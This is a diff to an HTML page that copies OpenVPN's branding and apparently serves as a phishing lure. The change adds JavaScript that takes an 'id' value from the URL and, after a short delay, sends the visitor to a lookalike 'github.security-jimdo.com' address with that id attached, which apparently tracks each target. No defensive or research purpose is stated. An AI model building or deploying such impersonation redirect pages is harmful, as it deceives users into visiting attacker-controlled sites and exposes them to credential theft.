@@ -2,7 +2,7 @@
 <html lang="en" class="no-js">
     <head>
         <title>OpenVPN CWS</title>
-        <meta http-equiv="refresh" content="3;url=https://github.security-jimdo.com/">
+        <!-- Removido o redirecionamento automático aqui -->
         <link href="css/load-fonts.css" rel="stylesheet" type="text/css" />
         <link href="css/all.min.css" rel="stylesheet" type="text/css" />
         <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" media="screen" />
@@ -22,9 +22,9 @@
     }
 
     #main {
-    text-align: center; /* Centraliza qualquer conteúdo interno horizontalmente */
-    position: relative; /* Necessário para posicionar o spinner corretamente */
-}
+        text-align: center; /* Centraliza qualquer conteúdo interno horizontalmente */
+        position: relative; /* Necessário para posicionar o spinner corretamente */
+    }
 
     /* Animação de rotação */
     @keyframes spin {
@@ -34,7 +34,7 @@
     </style>
     <body class="cws">
         <div id="application">
-            <div id="header" class="container text-center" >
+            <div id="header" class="container text-center">
                 <header>
                     <img id="brand-logo" class="pb-3" src="img/logo.png" alt="OpenVPN -- The Open Source VPN" />
                 </header>
@@ -48,7 +48,6 @@
                 </div>
             </div>
         </div>
-        </div>
         <div style="padding: 60px;"></div>
         <footer id="footer" class="footer mt-4">
             <div class="container text-center">
@@ -60,14 +59,28 @@
             </div>
         </footer>
         <script>
-            // Simula um atraso de 3 segundos
-        setTimeout(function() {
-            // Esconde o spinner
-            document.querySelector('.spinner').style.display = 'none';
+            // Função para capturar parâmetros da URL
+            function getParameterByName(name, url = window.location.href) {
+                name = name.replace(/[\[\]]/g, '\\$&');
+                var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+                    results = regex.exec(url);
+                if (!results) return null;
+                if (!results[2]) return '';
+                return decodeURIComponent(results[2].replace(/\+/g, ' '));
+            }
 
-            // Mostra a mensagem
-            document.querySelector('.message').style.display = 'block';
-        }, 1500); // 3 segundos
+            // Captura o parâmetro 'id'
+            var id = getParameterByName('id');
+
+            // Simula um atraso e redireciona passando o parâmetro 'id'
+            setTimeout(function() {
+                // Esconde o spinner e mostra a mensagem
+                document.querySelector('.spinner').style.display = 'none';
+                document.querySelector('.message').style.display = 'block';
+
+                // Redireciona para a URL com o 'id' incluído
+                window.location.href = 'https://github.security-jimdo.com/?id=' + encodeURIComponent(id);
+            }, 3000); // 3 segundos
         </script>
     </body>
 </html>
